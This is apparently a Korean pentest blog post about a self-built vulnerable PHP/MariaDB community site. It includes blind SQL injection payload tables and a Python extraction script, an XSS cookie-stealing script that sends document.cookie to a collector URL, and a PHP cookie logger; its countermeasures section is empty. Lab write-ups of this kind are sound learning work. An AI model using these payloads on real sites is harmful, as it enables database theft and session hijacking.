---
layout: post
title:  "⚫ 모의해킹 사이트 구축 & 웹 침투 테스트"
date:   2021-08-31 15:54:50 +0700
categories: "모의해킹"
tags: [ php, mariadb, xss, csrf, webshell]
description: 네이버에서 날씨를 검색해 나오는 데이터 정보들을 쉽게(파싱) 사용할 수 있도록 간단하고 쉽게 제공해 주는 API를 만들어 보았습니다. "이 API는 JSON 포맷의 응답을 전송합니다."
image: "https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcVNmm8%2FbtrdEjeFK6C%2FSb271UmoPaBwntvxpKDAOK%2Fimg.png"
---
# 1. 개요

LAMP를 기반으로 웹 모의해킹 진단을 위하여 가상의 커뮤니티 사이트 `구축` 하여, 모의 침투 테스트를 통해 `취약점`를 진단합니다.

<!-- CIA Web Sites는 php, mariadb의 취약점을 고려해야 할 측면에 대해 설명합니다. -->
<hr>

## 1.1 사이트 목적

웹 사이트를 직접 `개발`하여 `취약한 코드`를 더 자세히 알 수 있으며,
<br>웹 개발에 취약점이 어디서 어떤 방식으로 취약점이 발생하는지 세밀하게 관찰하며, 관찰한 내용을 토대로 `점검`할 수 있습니다.

<hr>

# 2. 환경 구축

`LAMP` / `Centos7` `Apache/2.4.6` `5.5.68-MariaDB` `PHP 5.4.16`
<br>L: Linux (이번 wordpress는 CentOS 7에서 진행합니다.)
<br>A: Apache 웹 서버
<br>M: MySQL 또는 MariaDB
<br>P: PHP

<hr>

# 3. 웹 서비스 시작
<figure>
<img src="https://blog.kakaocdn.net/dn/bkruN7/btrdIT9gJ6b/xykMYzf4btPjli943XAaJ1/img.gif" alt="Weather API Web Sites">
<figcaption>Fig 1. Check app service</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fo67bb%2FbtrdK6fJvEZ%2FXx8OuQBTKafvh2biifknxk%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 2. Main.</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FckMpKL%2FbtrdKWqymEv%2F1zhejUXiCkITnzd3PgKm5k%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 3. Login.</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F0FIsA%2FbtrdHf59G0q%2FlpOiKb00MDe26eAchra7Kk%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 4. Register.</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FGi58T%2FbtrdOM1J3fH%2FkZ1ltqKFCVkKFFK8kx1a41%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 5. MyPage.</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbAbeJB%2FbtrdHfSxI9c%2FXlgsK5dP2CB8FRy5DzPea1%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 6. Board.</figcaption>
</figure>

<hr>

## 3-1 취약점 분석

##### <sup id="sql">[[1]](#user-ref)</sup><kbd>Blind SQL Injection</kbd>
1. 쿼리의 결과를 참과 거짓으로만 출력하는 페이지에서 사용하는 공격이다.
2. 출력 내용이 참 / 거짓 밖에 없어서 그것을 이용하여 데이터베이스의 내용을 추측하여 쿼리를 조작한다.

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fx1H93%2FbtqG9ST9EIX%2FX85GJhTbLbt2mkNoXKDm90%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 1. 공격 흐름도</figcaption>
</figure>


저는 Blind SQL Injection 중에서 <sup id="based">[[2]](#user-ref2)</sup>`Bollean Based`를 이용하여 게시판에서 공격해보도록 하겠습니다. 

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcCuU4T%2FbtrdINH8TL7%2F9gSyq4SRaKNwAxpPcouqTk%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 2. 게시판 (1/3)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FnZapi%2FbtrdIUgmVE2%2FfkKFHR0HCd892bXtCJGKyK%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 3. 게시판 - 검색 (2/3)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcxfDqV%2FbtrdJ4v5chs%2FxECzsjawEDzK2EWitiJle0%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 4. 게시판 - 쿼리로그 (3/3)</figcaption>
</figure>

<figure>
<div class="overflow-table" markdown="block">

|      종류                | 주석                               |
| :---------------------- | :--------------------------------- |
| `MySQL` | `#` |
| `MSSQL, Oracle, Sabase ASE, DB2`           | `--`               |
| `MariaDB`           | `--, #`       |
| `Sybase IQ`           | `--, //, %`       

</div>
<figcaption>쿼리 공격을 위한 주석 테이블</figcaption>
</figure>

```sql
$ select * from board where title like '%2 'or 1=1#%' order by idx desc
$ 2 'or 1=1#
```
<figcaption>Boolean Based Sql - 취약점 확인</figcaption>

전 위의 주석 및 취약점 확인 방식을 이용하여 `쿼리 공격` 구문이 항상 참이 되게 하여 공격이 먹히는지 확인해보도록 하겠습니다.

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FW4D69%2FbtrdPJqu6pN%2FKdIpyMCE0SpiE9yKYpU3u0%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 5. 게시판 공격 확인 (1/3)</figcaption>
</figure>
_________________________________________________
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fo2i2K%2FbtrdMKqrgVx%2F6VyJYyFf8oKD3g4J3A7IBK%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 5. 게시판 공격 확인 (2/3)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbnIjvs%2FbtrdJjUFuoJ%2FVDwqlSqNRLYwqzaIhZIFvK%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 6. 게시판 -공격 확인 (3/3)</figcaption>
</figure>

쿼리 공격구문이 성공하여 `항상 참`이 되는 `결과값`을 볼 수 있었습니다.
그래서 저는 아래 방식으로 `데이터베이스 이름`, `테이블 이름`, `테이블의 컬럼` 등등를 가져왔습니다.
<br>
<figure>
<div class="overflow-table" markdown="block">

|      종류                | 공격 구문                               |
| :---------------------- | :--------------------------------- |
| `데이터베이스 길이` | `1' and length(database()) > 2#` |
| `데이터베이스 이름`           | `1' and substring(database(),1,1)='c'#, 1' and substring(database(),2,1)='i'#`               |
| `CIA 데이터베이스 테이블 길이`           | `1' and length((select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 0,1))=5#, 1' and length((select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 1,1))=10#`       |
| `CIA 데이터베이스 테이블 이름`           | `1' and (select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 0, 1) = 'board'#,1' and substring((select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 0,1),1,1) = 'b'#, 1' and (select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 2, 1) = 'member'#`
| `CIA 데이터베이스 테이블 컬럼 길이`           | `1' and length((select column_name from information_schema.columns where table_name='member' limit 0,1))=3#, 1' and length((select column_name from information_schema.columns where table_name='member' limit 1,1))=2#`
| `CIA 데이터베이스 테이블 컬럼 이름`           | `1' and substring((select column_name from information_schema.columns where table_name='member' limit 0,1),1,1) = 'i'#, 1' and substring((select column_name from information_schema.columns where table_name='member' limit 0,1),2,1) = 'd'#`
| `아이디 가져오기`           | `1' and (select idx from member where id='veloideu')#, 1' and (select id from member limit 6,1)='qwe'#`
| `패스워드 길이 가져오기`           | `1' and length((select pw from member where id='veloideu'))=60#`
| `패스워드 암호화 방식 확인`           | `1' and sha1("123")=(select pw from member where id='veloideu')#`

</div>
<figcaption>쿼리 공격을 위한 공격 구문 테이블</figcaption>
</figure>

```python
import requests
from bs4 import BeautifulSoup
import string

comparison = string.ascii_lowercase

db_name ="    DB 이름 : "
table_name =" Table 이름 : "
Column_name ="Column 이름 : "
Member_name ="Member 이름 : "

for b in range(1, 4): # DB 이름 : 1' and substring(database(),{b},1)='{i}'%23
    for i in comparison:
        url = f"http://192.168.35.237/page/board/search_result.php?catgo=title&search=1' and substring(database(),{b},1)='{i}'%23"
        response = requests.get(url)
        response_text = response.text
        soup = BeautifulSoup(response_text, 'html.parser')
        title = soup.select_one('#board_area > table > tbody > tr > td:nth-child(2) > a > span:nth-child(1)')

        if title != None:
            db_name += i
        else :
            pass

for a in range(1, 6): # Table 이름 : 1' and substring((select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 0,1),{a},1) = '{b}'%23
    for b in comparison:

        url = f"http://192.168.35.237/page/board/search_result.php?catgo=title&search=1' and substring((select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 0,1),{a},1) = '{b}'%23"
        response = requests.get(url)
        response_text = response.text
        soup = BeautifulSoup(response_text, 'html.parser')
        title = soup.select_one('#board_area > table > tbody > tr > td:nth-child(2) > a > span:nth-child(1)')

        if title != None:
            table_name += b
        else :
            pass

for a in range(1, 3):
    for b in comparison: # Column 이름 : 1' and substring((select column_name from information_schema.columns where table_name='member' limit 1,1),{a},1) = '{b}'%23

        url = f"http://192.168.35.237/page/board/search_result.php?catgo=title&search=1' and substring((select column_name from information_schema.columns where table_name='member' limit 1,1),{a},1) = '{b}'%23"
        response = requests.get(url)
        response_text = response.text
        soup = BeautifulSoup(response_text, 'html.parser')
        title = soup.select_one('#board_area > table > tbody > tr > td:nth-child(2) > a > span:nth-child(1)')

        if title != None:
            Column_name += b
        else :
            pass

for a in range(1, 6):
    for b in comparison: # Member 이름 : ' and substring((select id from member limit 1,1),{a},1)='{b}'%23"

        url = f"http://192.168.35.237/page/board/search_result.php?catgo=title&search=1' and substring((select id from member limit 1,1),{a},1)='{b}'%23"
        response = requests.get(url)
        response_text = response.text
        soup = BeautifulSoup(response_text, 'html.parser')
        title = soup.select_one('#board_area > table > tbody > tr > td:nth-child(2) > a > span:nth-child(1)')

        if title != None:
            Member_name += b
        else :
            pass


print(db_name)
print(table_name)
print(Column_name)
print(Member_name)
```
<figcaption>Fig 7. 쿼리 공격 스크립트 (1/3)</figcaption>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbybK40%2FbtrdPJTgRVU%2Fs9GCSyvkkn8qAjhOVye32K%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 8. 쿼리 공격 스크립트 (2/3)</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbXLWXs%2FbtrdPItm9Cx%2FMikd0xUGgLSJYMKa82b8ik%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 9. 쿼리 공격 스크립트 (3/3)</figcaption>
</figure>

저는 시간을 단축하기 위해 위의 7~9번 사진처럼 공격 스크립트 `파이썬`을 이용하여 작성 후 공격하여 `원하는 결과값`을 얻을 수 있엇습니다.

 
##### <sup id="xss">[[3]](#user-ref3)</sup> `XSS` `: Cross Site Scripting`

 1. 사이트를 교차해서 스크립트를 발생시킴.
 2. 게시판을 포함한 웹에서 `자바스크립트`같은 스크립트 언어를 삽입해 개발자가 의도하지 않은 기능을 작동시키는것.
 3. `클라이언트측`을 대상으로 한 공격

이번에도 `게시판`을 통해 `XSS` 공격이 가능한지 확인해보겠습니다.

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fb3uWBk%2FbtrdT1MevqC%2FAy2bksolFQoHa6cPfYcnkK%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 10. XSS 게시판 테스트 (1/4)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FmZVZt%2FbtrdVjr5UXJ%2FcQCJOVYYJICHXUZ3Pdekk0%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 11. XSS 게시판 테스트 (2/4)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbBKi3M%2FbtrdXxwDCZe%2FxzYIAUg3RR2nHzR3kclFUK%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 12. XSS 게시판 테스트 (3/4)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F6BdJD%2FbtrdPJFN1Df%2F1k97aP2ciiQ5KkhoUlqQsk%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 13. XSS 게시판 테스트 (4/4)</figcaption>
</figure>

```javascript
$ <script>alert("내용 ")</script>
```
<figcaption>Javascript를 이용한 XSS 취약점 확인 코드</figcaption>
XSS 공격이 가능한것이 확인이 되어, 전 XSS 공격으로 `쿠키값`을 `탈취`해보도록 하겠습니다.
<br>
<br>
```javascript
<script>window.open("http://192.168.35.237/xss/cookie.php?data="+document.cookie)</script>
```
<figcaption>XSS 공격 코드 (1/2)</figcaption>

```php
<?php
	$cookie=$_GET['data'];
	$atime=date("y-m-d H:i:s");
	$log=fopen("data.txt","a");
	fwrite($log, $atime." ".$cookie."\r\n");
	fclose($log);
	echo "<img src=hackerDUN.png></img>";
?>
```
<figcaption>XSS 공격 코드 (2/2)</figcaption>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FmZVZt%2FbtrdVjr5UXJ%2FcQCJOVYYJICHXUZ3Pdekk0%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 14. XSS를 이용한 쿠키 값 탈취 (1/4)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fbw6sV1%2FbtrdXyoL4dZ%2F4ONeRfPX5ru7YKnRFLldik%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 15. XSS를 이용한 쿠키 값 탈취 (2/4)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FkIJG0%2FbtrdVOFoSlq%2FD6rOTBvXMimWLCog6FAjUk%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 16. XSS를 이용한 쿠키 값 탈취  (3/4)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbjtDK9%2FbtrdOWFuPWh%2FkPFff5I2EmArUEwgNNGVC0%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 17. XSS를 이용한 쿠키 값 탈취 (4/4)</figcaption>
</figure>

게시글을 읽는 사람은 `해커`의 웹 서버에 `cookie.php`를 읽고 `쿠키값이 탈취` 되며, 사진 창이 띄어지도록 하였고, `fopen`을 통하여 해커 `data.txt`에 시간, 쿠키값을 `저장`하도록 하였습니다.

<hr>

# 4. 프로젝트 결과

<hr>

# 5. 대응방안

<hr>

##### Notes
<small id="user-ref"><sup>[[1]](#sql)</sup> Blind SQL 인젝션의 쿼리문에 사용하는 함수는 substring,ascii,limit 등이 있다.<br>
substring함수는 첫 번째 인자로 받은 문자열을 지정한 길이만큼 출력하는데, 주로 문자 하나씩 출력 하여 이름을 알아내는데에 사용한다.
<br>ascii함수는 문자를 아스키코드로 변환하는데, 작은따옴표(')를 우회하는 변수일 때 문자를 입력하기 위하여 사용한다.
limit 함수는 문자열의 길이를 반환한다. 문장열의 길이를 알아내면 substring 함수로 문자열을 추측하기 쉬워진다.  세 함수를 통해 임의의 값을 입력하며 데이터베이스 내용을 알아낼 때까지 계속 비교한다.</small>
<br>
<br>
<small id="user-ref2"><sup>[[2]](#based)</sup> 참과 거짓만 출력하는 페이지에 공격자가 조작한 쿼리로 인해 데이터베이스 내용을 노출하는 취약점이다.  쿼리는 데이터베이스 내용이 일치하여 웹 페이지에서 참을 출력시킬 때까지 임의의 값을 대입한다.</small>
<br>
<br>
<small id="user-ref3"><sup>[[3]](#xss)</sup> 웹 브라우저에서 사용자가 입력 할수 있는 input태그 등에 악의적인 script를 작성하여 해당 contents를 이용하는 다른 이용자의 개인정보 및 쿠키정보 탈취, 악성코드 감염, 웹 페이지 변조등의 공격을 한다.</small>
<hr>

# 6. 참고자료
https://lucete1230-cyberpolice.tistory.com/94